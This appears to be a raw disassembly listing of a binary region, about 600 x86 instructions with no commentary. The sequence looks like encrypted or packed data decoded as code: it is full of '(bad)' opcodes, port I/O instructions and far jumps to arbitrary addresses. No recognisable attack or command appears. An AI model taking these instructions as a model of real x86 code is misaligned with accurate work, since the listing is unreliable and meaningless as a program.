  4424d1:	mov    cl,0xde
  4424d3:	ja     0x44253f
  4424d5:	xchg   esp,eax
  4424d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4424d7:	push   cs
  4424d8:	xor    DWORD PTR [edi-0x67],edx
  4424db:	push   esi
  4424dc:	repz xchg ebx,eax
  4424de:	jge    0x4424bd
  4424e0:	dec    ecx
  4424e1:	inc    esp
  4424e2:	sbb    edx,eax
  4424e4:	outs   dx,BYTE PTR ds:[esi]
  4424e5:	xchg   ecx,eax
  4424e6:	mov    bl,0x1d
  4424e8:	out    0xa3,eax
  4424ea:	push   esi
  4424eb:	add    bh,dh
  4424ed:	xlat   BYTE PTR ds:[ebx]
  4424ee:	mov    al,0x9b
  4424f0:	sbb    cl,BYTE PTR [eax+0x2c]
  4424f3:	nop
  4424f4:	sbb    edx,DWORD PTR [edx-0x3f]
  4424f7:	paddsb mm5,QWORD PTR [esi+ecx*4]
  4424fb:	cmp    al,0x97
  4424fd:	inc    esp
  4424fe:	in     al,dx
  4424ff:	push   cs
  442500:	bound  eax,QWORD PTR [edx]
  442502:	add    BYTE PTR [ecx+0x2e263213],bh
  442508:	ret    0xae3
  44250b:	mov    esi,0xc846a940
  442510:	pop    DWORD PTR [ebx-0x64]
  442513:	stc    
  442514:	pushf  
  442515:	test   al,0xef
  442517:	adc    dl,ch
  442519:	sbb    eax,0xe9dfb366
  44251e:	push   ss
  44251f:	inc    esi
  442520:	ins    BYTE PTR es:[edi],dx
  442521:	cs out 0x88,al
  442524:	inc    ebx
  442525:	add    esi,esi
  442527:	es into 
  442529:	dec    edx
  44252a:	stos   DWORD PTR es:[edi],eax
  44252b:	sbb    dl,BYTE PTR [ebp+0x25842293]
  442531:	fidiv  DWORD PTR [edi-0x8bf8983]
  442537:	in     al,0xe7
  442539:	stc    
  44253a:	scas   eax,DWORD PTR es:[edi]
  44253b:	push   edx
  44253c:	pop    esp
  44253d:	pop    ebx
  44253e:	popa   
  44253f:	sub    DWORD PTR [esi-0x1701cb6f],0xffffffb8
  442546:	sti    
  442547:	fcomp  DWORD PTR [ebx+eiz*4-0x2801300b]
  44254e:	mov    esp,0x209fc357
  442553:	loopne 0x4424d5
  442555:	leave  
  442556:	les    edx,FWORD PTR [ecx+ebp*2]
  442559:	leave  
  44255a:	in     al,0x5d
  44255c:	push   ecx
  44255d:	fwait
  44255e:	popf   
  44255f:	aam    0xed
  442561:	push   edi
  442562:	sub    DWORD PTR [ebx],esi
  442564:	sahf   
  442565:	sti    
  442566:	jmp    0x3fe6:0xa2c79a75
  44256d:	sbb    BYTE PTR [ebp-0x104efb69],ch
  442573:	test   BYTE PTR [ebx-0x3],bl
  442576:	in     eax,dx
  442577:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  442578:	pop    ecx
  442579:	pop    edi
  44257a:	imul   esi,edx,0xf0f5aa26
  442580:	mov    dl,0xce
  442582:	inc    eax
  442583:	or     al,0xf
  442585:	sbb    dl,bh
  442587:	lea    ebx,[ecx+0x30033b04]
  44258d:	arpl   WORD PTR [eax+0x755c361],sp
  442593:	mov    BYTE PTR [ecx],bh
  442595:	iret   
  442596:	adc    al,BYTE PTR [ecx]
  442598:	mov    bl,0x8
  44259a:	or     dh,ch
  44259c:	jb     0x44259e
  44259e:	sub    dl,BYTE PTR [eax]
  4425a0:	stos   BYTE PTR es:[edi],al
  4425a1:	ficomp WORD PTR [edx]
  4425a3:	xchg   esp,eax
  4425a4:	jbe    0x4425f8
  4425a6:	sti    
  4425a7:	and    edx,DWORD PTR [edx]
  4425a9:	mov    eax,ds:0x6516ea3
  4425ae:	(bad)  
  4425af:	dec    ebx
  4425b0:	loopne 0x442617
  4425b2:	jo     0x4425ca
  4425b4:	int    0x91
  4425b6:	outs   dx,DWORD PTR ds:[esi]
  4425b7:	xchg   esp,eax
  4425b8:	adc    BYTE PTR [eax-0x165aca0e],0x3b
  4425bf:	(bad)  
  4425c0:	dec    ecx
  4425c1:	xchg   esp,eax
  4425c2:	(bad)  
  4425c4:	push   ebp
  4425c5:	(bad)
  4425c8:	rcl    DWORD PTR [eax-0x26],0xdf
  4425cc:	jo     0x442573
  4425ce:	popf   
  4425cf:	cwde   
  4425d0:	(bad)  
  4425d2:	cmp    DWORD PTR ds:0xd2a4f5a0,ebp
  4425d8:	(bad)  
  4425d9:	mov    ch,0x4d
  4425db:	(bad)  
  4425dc:	shl    dl,0x82
  4425df:	push   esi
  4425e0:	xor    DWORD PTR [ebx],edx
  4425e2:	or     BYTE PTR ds:0x18bc6eb6,bl
  4425e8:	daa    
  4425e9:	pop    edi
  4425ea:	repnz std 
  4425ec:	or     BYTE PTR [eax-0x2a19984f],dl
  4425f2:	cmp    al,al
  4425f4:	mov    ah,0x29
  4425f6:	pop    ecx
  4425f7:	(bad)  
  4425f8:	int3   
  4425f9:	dec    edx
  4425fa:	jnp    0x44264c
  4425fc:	sub    al,0x5c
  4425fe:	adc    eax,0xf1a9a9af
  442603:	dec    ecx
  442604:	xchg   ebp,esi
  442606:	adc    cl,BYTE PTR [edi+0x5f]
  442609:	mov    ecx,DWORD PTR [ebp-0x428a7646]
  44260f:	(bad)  
  442611:	dec    esi
  442612:	push   ds
  442613:	int    0x6a
  442615:	inc    eax
  442616:	jmp    FWORD PTR [esi+ecx*8]
  442619:	out    0x98,eax
  44261b:	sbb    esp,edx
  44261d:	test   eax,0xdb26800f
  442622:	(bad)  
  442623:	cli    
  442624:	xchg   BYTE PTR [ebx-0x5b],al
  442627:	shld   esi,edi,0xb3
  44262b:	mov    esp,0x3fe8218a
  442630:	in     al,dx
  442631:	test   BYTE PTR [ebp-0x26],ah
  442634:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  442635:	adc    ch,al
  442637:	stc    
  442638:	ficomp DWORD PTR [ebp-0x2bcf6467]
  44263e:	je     0x44264c
  442640:	ret    0x352b
  442643:	nop
  442644:	pop    es
  442645:	loopne 0x442616
  442647:	jmp    0x44269f
  442649:	sahf   
  44264a:	and    ch,bh
  44264c:	adc    bh,ch
  44264e:	mov    edi,0x6248b564
  442653:	lods   eax,DWORD PTR ss:[esi]
  442655:	mov    al,ds:0x953a619e
  44265a:	adc    ebp,DWORD PTR [edx+0x4c931efb]
  442660:	mov    ah,0xd9
  442662:	dec    esp
  442663:	add    eax,0x651744c
  442668:	jns    0x44261c
  44266a:	dec    esp
  44266b:	int3   
  44266c:	mul    BYTE PTR [esp+edi*8]
  44266f:	mov    fs,esi
  442671:	fwait
  442672:	mov    dl,0xf5
  442674:	xchg   edi,eax
  442675:	inc    ebx
  442676:	inc    edx
  442677:	ins    DWORD PTR es:[edi],dx
  442678:	outs   dx,BYTE PTR ds:[esi]
  442679:	lods   al,BYTE PTR ds:[esi]
  44267a:	xor    DWORD PTR [ebx],ecx
  44267c:	cmp    bh,0x3a
  44267f:	lahf   
  442680:	mov    BYTE PTR [ebp-0x57b575e0],al
  442686:	ins    DWORD PTR es:[edi],dx
  442687:	loopne 0x4426da
  442689:	xor    esp,esp
  44268b:	scas   eax,DWORD PTR es:[edi]
  44268c:	iret   
  44268d:	fdivr  QWORD PTR [eax+0xa43d71c]
  442693:	jae    0x4426b6
  442695:	jo     0x442672
  442697:	and    eax,0x7209bf72
  44269c:	jmp    0x8e43c27e
  4426a1:	or     dl,bh
  4426a3:	and    ebx,DWORD PTR ds:0xc977270b
  4426a9:	mov    al,cl
  4426ab:	mov    ds:0xbd2d402,eax
  4426b0:	xor    DWORD PTR ds:0x979f8e6,ebp
  4426b6:	lahf   
  4426b7:	mov    ch,al
  4426b9:	xlat   BYTE PTR ds:[ebx]
  4426ba:	ds inc ebx
  4426bc:	call   0x5b10:0x7c02fc46
  4426c3:	cld    
  4426c4:	xchg   ebp,eax
  4426c5:	or     dh,dl
  4426c7:	sar    BYTE PTR [ecx-0x59abacdd],cl
  4426cd:	shl    DWORD PTR [edx],0x10
  4426d0:	aas    
  4426d1:	addr16 sub al,0x5a
  4426d4:	jo     0x442686
  4426d6:	lds    edx,FWORD PTR [ebp-0x451dc388]
  4426dc:	paddd  mm6,QWORD PTR [esi+0x56]
  4426e0:	xlat   BYTE PTR ds:[ebx]
  4426e1:	inc    ebp
  4426e2:	lds    eax,FWORD PTR [esi-0x53]
  4426e5:	aaa    
  4426e6:	pop    ecx
  4426e7:	(bad)  
  4426e8:	aas    
  4426e9:	imul   ebx,ebp,0x5ce21139
  4426ef:	adc    BYTE PTR [edx-0x35],ch
  4426f2:	add    ebp,DWORD PTR [edi]
  4426f4:	mov    WORD PTR [ecx+0x26eab2a3],gs
  4426fa:	test   eax,0xa999daec
  4426ff:	xchg   ebx,eax
  442700:	and    dl,BYTE PTR [ecx+0x6f]
  442703:	mov    DWORD PTR [eax-0x59a53a27],0x1a3c12fe
  44270d:	mov    esp,0x85dcd8ac
  442712:	stos   BYTE PTR es:[edi],al
  442713:	(bad)  
  442714:	fstp   TBYTE PTR [edx]
  442716:	mov    dh,0xf3
  442718:	clc    
  442719:	dec    edx
  44271a:	ins    BYTE PTR es:[edi],dx
  44271b:	sbb    al,0xd5
  44271d:	into   
  44271e:	outs   dx,BYTE PTR ds:[esi]
  44271f:	inc    ebx
  442720:	adc    cl,bh
  442722:	pop    eax
  442723:	test   ebx,edi
  442725:	ret    
  442726:	add    esi,ebp
  442728:	pop    es
  442729:	xchg   edi,eax
  44272a:	jge    0x4426f6
  44272c:	fs mov ah,0x7
  44272f:	rcl    BYTE PTR [ebx+edx*2+0x145915dd],cl
  442736:	inc    eax
  442737:	rcr    BYTE PTR [ecx-0x28],0xfb
  44273b:	pop    ecx
  44273c:	dec    ebx
  44273d:	jne    0x4426e3
  44273f:	fidivr WORD PTR [ebx]
  442741:	and    BYTE PTR [ebp-0x2cc43165],bh
  442747:	enter  0xbfe8,0x52
  44274b:	adc    al,0x18
  44274d:	mov    dh,0x13
  44274f:	xchg   ecx,eax
  442750:	mov    ebx,0xe52f5b5c
  442755:	jno    0x442733
  442757:	push   cs
  442758:	jl     0x4427c2
  44275a:	loopne 0x442723
  44275c:	leave  
  44275d:	cmp    eax,ebp
  44275f:	aam    0xef
  442761:	inc    esi
  442762:	jae    0x44272b
  442764:	in     al,0x55
  442766:	aad    0xb1
  442768:	pop    es
  442769:	in     al,dx
  44276a:	xchg   esp,eax
  44276b:	ss retf 
  44276d:	out    0x62,al
  44276f:	stc    
  442770:	rcr    DWORD PTR [esi-0x52],1
  442773:	retf   
  442774:	xchg   esp,eax
  442775:	test   edi,edi
  442777:	and    al,0xce
  442779:	dec    edx
  44277a:	jp     0x442748
  44277c:	inc    eax
  44277d:	jmp    0x9e64:0xb9281371
  442784:	mov    ah,dh
  442786:	loope  0x4427a7
  442788:	jecxz  0x442786
  44278a:	iret   
  44278b:	sbb    eax,0xdea45a72
  442790:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  442791:	mov    al,ds:0x541843b1
  442796:	cdq    
  442797:	add    al,ah
  442799:	sahf   
  44279a:	or     eax,0x6152bd4f
  44279f:	jo     0x4427b5
  4427a1:	je     0x4427e9
  4427a3:	and    eax,0x6f39e054
  4427a8:	xlat   BYTE PTR ds:[ebx]
  4427a9:	cmc    
  4427aa:	mov    esi,0xd1e8cada
  4427af:	cwde   
  4427b0:	fisub  WORD PTR [ebp-0x24]
  4427b3:	lods   eax,DWORD PTR ds:[esi]
  4427b4:	xchg   BYTE PTR [ecx],dh
  4427b6:	call   0x9eb5:0xae13b1e3
  4427bd:	jne    0x4427e3
  4427bf:	xchg   edi,esi
  4427c1:	fwait
  4427c2:	imul   esi,DWORD PTR [ebp+0x5088e6c2],0x40
  4427c9:	dec    edx
  4427ca:	jbe    0x442772
  4427cc:	retf   0xd551
  4427cf:	inc    edi
  4427d0:	add    ch,BYTE PTR [edi]
  4427d2:	mov    ch,0xb5
  4427d4:	(bad)  [eax-0x1a]
  4427d7:	dec    esp
  4427d8:	(bad)  
  4427d9:	dec    cl
  4427db:	sbb    DWORD PTR [edx+ebx*4+0x625551f],0x2fde248f
  4427e6:	int    0xaf
  4427e8:	call   0x5854:0x9af3977
  4427ef:	cmp    BYTE PTR [ecx],0xa9
  4427f2:	pop    esp
  4427f3:	cdq    
  4427f4:	dec    edx
  4427f5:	mov    al,0x55
  4427f7:	pop    ebx
  4427f8:	or     eax,0x4099c087
  4427fd:	mov    edi,DWORD PTR [esi+0x7ca592c7]
  442803:	mov    edi,0x1a0d934c
  442808:	adc    BYTE PTR [esi],bl
  44280a:	(bad)  
  44280b:	xor    BYTE PTR [ebx+0x6c],0x6f
  44280f:	ins    BYTE PTR es:[edi],dx
  442810:	ret    0xe06b
  442813:	dec    ebx
  442814:	push   ecx
  442815:	ins    DWORD PTR es:[edi],dx
  442816:	adc    eax,ebx
  442818:	cmp    al,0xe8
  44281a:	xchg   BYTE PTR [ebp-0x50],dl
  44281d:	mov    dl,0x58
  44281f:	adc    eax,0x91d4736b
  442824:	jae    0x4427fc
  442826:	mov    edi,0xbbc7b853
  44282b:	mov    ebx,0x8c288aa1
  442830:	inc    eax
  442831:	dec    esi
  442832:	inc    esi
  442833:	push   eax
  442834:	push   0x0
  442836:	ficom  WORD PTR [esi]
  442838:	js     0x442843
  44283a:	stos   BYTE PTR es:[edi],al
  44283b:	push   cs
  44283c:	daa    
  44283d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44283e:	sbb    ebp,ebx
  442840:	stos   DWORD PTR es:[edi],eax
  442841:	xchg   ebx,eax
  442842:	sbb    al,0xc8
  442844:	xchg   BYTE PTR [edi-0x69],cl
  442847:	jmp    0x44283b
  442849:	mov    esp,DWORD PTR [eax+0x1e]
  44284c:	(bad)  
  44284d:	xor    eax,0x30aa35a4
  442852:	xchg   ecx,eax
  442853:	cmp    DWORD PTR [ecx+ebp*1-0x107fd3f2],0xffffffa8
  44285b:	(bad)  
  44285c:	pop    ss
  44285d:	test   BYTE PTR [edx+0x60d1c8b9],ch
  442863:	xchg   ebx,eax
  442864:	or     al,bl
  442866:	xchg   edx,eax
  442867:	retf   
  442868:	scas   al,BYTE PTR es:[edi]
  442869:	pushf  
  44286a:	jae    0x442856
  44286c:	jge    0x442817
  44286e:	outs   dx,BYTE PTR ds:[esi]
  44286f:	call   0x9c81:0x37aac406
  442876:	rcl    DWORD PTR [edx],1
  442878:	push   edi
  442879:	or     eax,0x1f11a8d1
  44287e:	adc    DWORD PTR [ecx+0x26],ebx
  442881:	les    ebp,FWORD PTR [ebp+0x55ad1e18]
  442887:	add    eax,0x2bd0024d
  44288c:	or     bh,BYTE PTR [eax+edx*8+0x7b]
  442890:	idiv   ah
  442892:	mov    ecx,0xef77c847
  442897:	out    0xaf,eax
  442899:	pusha  
  44289a:	xchg   ecx,eax
  44289b:	test   al,0x47
  44289d:	rcl    al,0xa6
  4428a0:	int3   
  4428a1:	inc    eax
  4428a2:	push   gs
  4428a4:	mov    ebp,eax
  4428a6:	add    DWORD PTR [eax+ebx*4-0x3c849803],esi
  4428ad:	dec    ecx
  4428ae:	xchg   ecx,eax
  4428af:	outs   dx,BYTE PTR ds:[esi]
  4428b0:	aam    0x8a
  4428b2:	lds    esp,FWORD PTR [ecx]
  4428b4:	daa    
  4428b5:	lahf   
  4428b6:	ret    0x32d9
  4428b9:	fxch   st(6)
  4428bb:	mov    al,BYTE PTR [edx+0x47]
  4428be:	out    dx,eax
  4428bf:	jg     0x442877
  4428c1:	pop    ecx
  4428c2:	test   al,0x1b
  4428c4:	pop    es
  4428c5:	xor    edi,0x3d312682
  4428cb:	mov    BYTE PTR [edi+0x3c],cl
  4428ce:	mov    esi,0x89a25c1a
  4428d3:	stos   BYTE PTR es:[edi],al
  4428d4:	cmp    cl,al
  4428d6:	(bad)  
  4428d8:	popf   
  4428d9:	jae    0x4428aa
  4428db:	(bad)  
  4428dc:	rol    BYTE PTR [ebx+0x42d4b74b],cl
  4428e2:	ror    ebp,cl
  4428e4:	jmp    0x4d955bb4
  4428e9:	out    dx,al
  4428ea:	jbe    0x4428ec
  4428ec:	dec    ebp
  4428ed:	xor    BYTE PTR [edi-0x5b687a6d],cl
  4428f3:	cwde   
  4428f4:	add    ah,BYTE PTR [esi+0x3771d07f]
  4428fa:	pusha  
  4428fb:	ret    0x9971
  4428fe:	cmp    eax,0x16e542f
  442903:	gs jo  0x4428aa
  442906:	or     al,0xab
  442908:	vpsllw xmm2,xmm6,XMMWORD PTR [eax-0x7d]
  44290d:	cmp    eax,0x8740bbfb
  442912:	in     eax,dx
  442913:	(bad)
  442916:	iret   
  442917:	fidivr DWORD PTR [ebx]
  442919:	xchg   esi,eax
  44291a:	pop    esp
  44291b:	icebp  
  44291c:	xor    BYTE PTR [eax-0x6e],ah
  44291f:	xchg   DWORD PTR [edi+0x660f9afd],eax
  442925:	(bad)  
  442926:	mov    edi,0x428a3ddb
  44292b:	mov    dh,0x49
  44292d:	mov    ds:0x553f050c,eax
  442932:	ret    
  442933:	cmp    DWORD PTR [eax+ebx*2-0x23],edi
  442937:	mov    edi,0xcb84d447
  44293c:	jg     0x4429a5
  44293e:	push   0xfffffffe
  442940:	pop    edx
  442941:	leave  
  442942:	xchg   ebp,eax
  442943:	xor    dh,ch
  442945:	jg     0x4429ab
  442947:	cli    
  442948:	arpl   WORD PTR [ebx-0x3d],sp
  44294b:	pop    es
  44294c:	pop    es
  44294d:	adc    dl,BYTE PTR [ecx]
  44294f:	xchg   edx,eax
  442950:	push   cs
  442951:	cmc    
  442952:	mov    WORD PTR [edx+0x3c7a2722],cs
  442958:	test   eax,0xe4d351af
  44295d:	sub    edx,esi
  44295f:	ss and eax,0x9854e955
  442965:	popa   
  442966:	outs   dx,DWORD PTR ds:[esi]
  442967:	mov    ds:0xbc15817f,eax
  44296c:	std    
  44296d:	adc    eax,0x8232e6b0
  442972:	inc    ecx
  442973:	hlt    
  442974:	imul   esi,DWORD PTR [esi+0x59ec61a2],0xffffffdf
  44297b:	xor    BYTE PTR [eax],0x5a
  44297e:	jmp    eax
  442980:	sub    DWORD PTR [ebx-0x3c],esp
  442983:	popa   
  442984:	pop    ss
  442985:	xchg   ebp,eax
  442986:	mov    eax,0xbfdb7d35
  44298b:	adc    al,0x60
  44298d:	fadd   DWORD PTR [ecx+ebx*8-0x6808e519]
  442994:	jnp    0x44292f
  442996:	jno    0x442997
  442998:	test   al,0x29
  44299a:	mov    esi,edi
  44299c:	xor    ah,cl
  44299e:	and    BYTE PTR [edi+0x15e90dcd],bl
  4429a4:	inc    edx
  4429a5:	shl    ebx,cl
  4429a7:	inc    eax
  4429a8:	inc    esi
  4429a9:	inc    eax
  4429aa:	and    BYTE PTR [ebp-0x1a],ch
  4429ad:	mov    ebp,0x945165a8
  4429b2:	push   es
  4429b3:	(bad)  [ecx-0x42]
  4429b6:	add    al,0xfa
  4429b8:	test   eax,0xaf12ad17
  4429bd:	add    eax,0x2816910c
  4429c2:	hlt    
  4429c3:	jmp    0xd4c285ec
  4429c8:	xor    BYTE PTR [esi+edx*4+0x15bf31e5],ah
  4429cf:	and    bh,BYTE PTR [ebp-0x5bb44967]
  4429d5:	fild   DWORD PTR [edx]
  4429d7:	cmp    al,0x5a
  4429d9:	fidivr WORD PTR [eax+0x31]
  4429dc:	inc    edx
  4429dd:	jl     0x442999
  4429df:	repz push 0x81f21aec
  4429e5:	lea    ebp,[edi-0x21]
  4429e8:	aas    
  4429e9:	jl     0x4429ed
  4429eb:	mov    cl,0xf2
  4429ed:	xchg   esi,eax
  4429ee:	imul   esi,DWORD PTR [edx-0x7b],0xffffffa3
  4429f2:	jno    0x4429a1
  4429f4:	lds    edi,FWORD PTR [eax+0x5d]
  4429f7:	adc    BYTE PTR [eax-0x1ce82a02],dh
  4429fd:	test   eax,0xb6eba756
  442a02:	add    BYTE PTR [ecx+0x33],cl
  442a05:	out    0xe,al
  442a07:	add    DWORD PTR [ecx+ecx*8-0x3ae3ba05],ebx
  442a0e:	pop    edi
  442a0f:	push   eax
  442a10:	dec    esi
  442a11:	bound  ebx,QWORD PTR [ebx+edx*1-0x30]
  442a15:	or     eax,0x29a0808f
  442a1a:	je     0x442a1b
  442a1c:	sbb    eax,0xf275fc94
  442a21:	or     dh,dh
  442a23:	in     al,0xb7
  442a25:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  442a26:	cwde   
  442a27:	ins    BYTE PTR es:[edi],dx
  442a28:	sbb    eax,0xc4ea588
  442a2d:	push   ds
  442a2e:	rol    BYTE PTR [esi+0xd],1
  442a31:	jbe    0x442a1d
  442a33:	mul    BYTE PTR [esi+ecx*2+0xb]
  442a37:	mov    ch,0x4
  442a39:	mov    WORD PTR [edx],cs
  442a3b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  442a3c:	mov    ebx,edi
  442a3e:	jge    0x442a92
  442a40:	fist   DWORD PTR [eax-0x67]
  442a43:	jb     0x442a94
  442a45:	push   0x61
  442a47:	loopne 0x442a4d
  442a49:	nop
  442a4a:	(bad)  
  442a4b:	jmp    0xb0967c67
  442a50:	mov    ah,0xc
  442a52:	dec    ecx
  442a53:	add    DWORD PTR [edi-0x7e],ebp
  442a56:	lahf   
  442a57:	sub    edi,DWORD PTR ds:0x1790bd9f
  442a5d:	imul   ebp,esp,0x7d409d4c
  442a63:	add    edi,ecx
  442a65:	(bad)  
  442a66:	cld    
  442a67:	mov    dh,0xe4
  442a69:	imul   ebp,DWORD PTR [ebx+edi*4-0x65],0x8a11d2f7
  442a71:	jge    0x442ac4
  442a73:	sbb    ecx,esp
  442a75:	pop    ebx
  442a76:	std    
  442a77:	lock ret 
  442a79:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  442a7a:	jecxz  0x442a80
  442a7c:	in     al,0x7f
  442a7e:	lock inc eax
  442a80:	je     0x442ad0
  442a82:	ret    0x29e
  442a85:	cmp    edi,DWORD PTR [edx]
  442a87:	jb     0x442ace
  442a89:	push   ebx
  442a8a:	sbb    dl,BYTE PTR [ebx+0x21]
  442a8d:	dec    edx
  442a8e:	shr    DWORD PTR [edx],cl
  442a90:	jnp    0x442b04
  442a92:	sub    BYTE PTR [ecx],cl
  442a94:	sub    al,0xc
  442a96:	fisttp WORD PTR [esi-0x331356d5]
  442a9c:	fild   DWORD PTR [ecx]
  442a9e:	xchg   edx,eax
  442a9f:	mov    edx,0x9a5012a9
  442aa4:	(bad)  
  442aa5:	mov    eax,0xcf9fea11
  442aaa:	adc    ebx,DWORD PTR [edx]
  442aac:	das    
  442aad:	push   edi
  442aae:	pop    edx
  442aaf:	adc    DWORD PTR [edi+0x50be1417],ebx
  442ab5:	lods   eax,DWORD PTR ds:[esi]
  442ab6:	fucomp st(0)
  442ab8:	jmp    0xa69a69e7
  442abd:	add    eax,0x9de968c
  442ac2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  442ac3:	and    DWORD PTR [eax],esp
  442ac5:	jge    0x442ad8
  442ac7:	(bad)  
  442ac8:	xlat   BYTE PTR ds:[ebx]
  442ac9:	call   0xdb6dcf7f
  442ace:	imul   edx,DWORD PTR [edi],0xfadc12f2
  442ad4:	dec    eax
  442ad5:	mov    cl,0x36
  442ad7:	arpl   WORD PTR [edx-0x37],dx
  442ada:	dec    ebx
  442adb:	(bad)  [esi+eax*4-0x65]
  442adf:	jl     0x442a7f
  442ae1:	repz and DWORD PTR [esi+eiz*4+0x2b],esi
  442ae6:	sti    
  442ae7:	xchg   esp,eax
  442ae8:	pop    edi
  442ae9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  442aea:	xchg   edx,eax
  442aeb:	sbb    edi,DWORD PTR [eax]
  442aed:	or     BYTE PTR [ecx],ah
  442aef:	mov    eax,0xc7e33bd9
  442af4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  442af5:	jo     0x442b6f
  442af7:	jb     0x442a7c
  442af9:	lds    eax,FWORD PTR ds:0xb13b61ae
  442aff:	cld    
  442b00:	jg     0x442b6a
  442b02:	jo     0x442b26
  442b04:	push   esp
  442b05:	jo     0x442ace
  442b07:	test   edi,edi
  442b09:	retf   
  442b0a:	mov    BYTE PTR [edi],ah
  442b0c:	iret   
  442b0d:	stc    
  442b0e:	cmc    
  442b0f:	imul   BYTE PTR [edi+0x6eecae9b]
  442b15:	jl     0x442adf
  442b17:	lea    esi,[edx-0xc]
  442b1a:	sbb    BYTE PTR [edi+0x3b51dc8c],bh
  442b20:	pop    eax
  442b21:	jge    0x442ac7
  442b23:	inc    esi
  442b24:	les    edx,FWORD PTR [esi+ebx*4-0x1c]
  442b28:	xchg   BYTE PTR [esi+0x206f7e33],bh
  442b2e:	das    
  442b2f:	aas    
  442b30:	mov    al,0xcc
  442b32:	xchg   edi,eax
  442b33:	mov    ds:0xd4e5411e,eax
  442b38:	xchg   al,cl
  442b3a:	dec    edx
  442b3b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  442b3c:	jp     0x442aee
  442b3e:	imul   al
  442b40:	or     bl,0x83
  442b43:	sub    al,0x47
  442b45:	mov    eax,ds:0x274b7855
  442b4a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  442b4b:	and    eax,DWORD PTR [ecx+0x13]
  442b4e:	cdq    
  442b4f:	nop
  442b50:	cmc    
  442b51:	fisub  DWORD PTR [eax]
  442b53:	in     al,0xf6
  442b55:	(bad)  
  442b56:	mov    ebp,0xa502eb4e
  442b5b:	add    eax,0x208908a6
  442b60:	enter  0x52e5,0x37
  442b64:	arpl   WORD PTR [eax],si
  442b66:	push   eax
  442b67:	sub    cl,bh
  442b69:	inc    eax
  442b6a:	adc    ebx,0xffffffc1
  442b6d:	adc    eax,0xa38e0e91
  442b72:	fsub   DWORD PTR [edx]
  442b74:	adc    edx,DWORD PTR [ebp+0x35004cca]
  442b7a:	inc    ebx
  442b7b:	rcl    BYTE PTR [ecx+eax*2+0x5daeef49],0x23
  442b83:	enter  0x2f2d,0xbd
  442b87:	jmp    0x442b37
  442b89:	or     BYTE PTR [ebx+0x5f],bl
  442b8c:	rcr    BYTE PTR [ebp+0x778b6044],1
  442b92:	push   ebp
  442b93:	and    BYTE PTR [edx+0x22],0xc9
  442b97:	xchg   ebp,eax
  442b98:	xchg   edx,eax
  442b99:	gs aaa 
  442b9b:	mov    eax,0xe9363aa4
  442ba0:	test   eax,0x5afd5c7f
  442ba5:	stos   DWORD PTR es:[edi],eax
  442ba6:	mov    dl,0xdb
  442ba8:	jns    0x442b4e
  442baa:	aad    0xd
  442bac:	outs   dx,BYTE PTR ds:[esi]
  442bad:	cli    
  442bae:	sbb    DWORD PTR [eax],ebx
  442bb0:	sub    ebp,DWORD PTR [ecx+0x3b]
  442bb3:	xor    eax,0x4a2cb9ad
  442bb8:	push   es
  442bb9:	add    al,0xd
  442bbb:	mov    eax,0xa850e3e2
  442bc0:	jbe    0x442c0c
  442bc2:	add    al,0xcd
  442bc4:	test   DWORD PTR [eax+0x2551b579],esi
  442bca:	(bad)  
  442bcb:	xor    ebp,DWORD PTR [ebx+0x28a3c150]
  442bd1:	jnp    0x442c01
  442bd3:	sar    BYTE PTR [ebx-0x74],0x7b
  442bd7:	or     bh,BYTE PTR [ebp+0x46d2fdd6]
  442bdd:	add    eax,0x87959373
  442be2:	imul   edi,DWORD PTR [ebp+0x26],0x4
  442be6:	int    0xd8
  442be8:	mov    al,0x82
  442bea:	adc    bh,ah
  442bec:	mov    edi,0xaf708a85
  442bf1:	jmp    0x860c:0xaf20eadb
  442bf8:	stc    
  442bf9:	dec    esi
  442bfa:	xchg   BYTE PTR [ecx+0x6e],al
  442bfd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  442bfe:	pop    ecx
  442bff:	sub    cl,BYTE PTR [ebp+0x7e893112]
  442c05:	push   edx
  442c06:	inc    esp
  442c07:	adc    al,0x35
  442c09:	test   esi,0x86696be9
  442c0f:	ret    0x2cae
  442c12:	xchg   ebp,eax
  442c13:	xchg   DWORD PTR [ebx-0x1d],ecx
  442c16:	cmp    DWORD PTR [edx],ecx
  442c18:	pop    esi
  442c19:	or     BYTE PTR [edx+0x514580fc],ch
  442c1f:	adc    DWORD PTR [ebx+0x3c],0xd118d1c8
  442c26:	dec    eax
  442c27:	mov    ds:0x9388ef81,al
  442c2c:	mov    ebp,0x9081ce1b
  442c31:	sub    bh,BYTE PTR [edi-0x560b0dda]
  442c37:	ja     0x442c99
  442c39:	ror    al,cl
  442c3b:	in     al,dx
  442c3c:	in     eax,0x75
  442c3e:	mov    al,ds:0x3cf5467b
  442c43:	mov    cl,0x48
  442c45:	in     al,dx
  442c46:	jl     0x442c18
  442c48:	push   eax
  442c49:	mov    bh,0xc
  442c4b:	or     BYTE PTR [edx-0x17],bl
  442c4e:	fs ins BYTE PTR es:[edi],dx
  442c50:	(bad)  
  442c51:	int3   
  442c52:	mov    ecx,0xf42e0505
  442c57:	daa    
  442c58:	or     ah,bh
  442c5a:	mov    al,ds:0xd2d8a2a2
  442c5f:	sub    DWORD PTR [edx],ebp
  442c61:	inc    ebx
  442c62:	inc    edx
  442c63:	mov    bl,0x94
  442c65:	outs   dx,BYTE PTR ds:[esi]
  442c66:	fistp  QWORD PTR [ebx+0x544ffc94]
  442c6c:	push   ss
  442c6d:	inc    esp
  442c6e:	and    eax,0xbd8ebf84
  442c73:	cmp    eax,0x889cc506
  442c78:	dec    ebp
  442c79:	aaa    
  442c7a:	xchg   ebx,eax
  442c7b:	ins    BYTE PTR es:[edi],dx
  442c7c:	mov    ds:0x9edc5b4c,al
  442c81:	cmp    BYTE PTR [edi+ecx*8-0x44],ch
  442c85:	pop    esp
  442c86:	cdq    
  442c87:	int    0xf3
  442c89:	push   edi
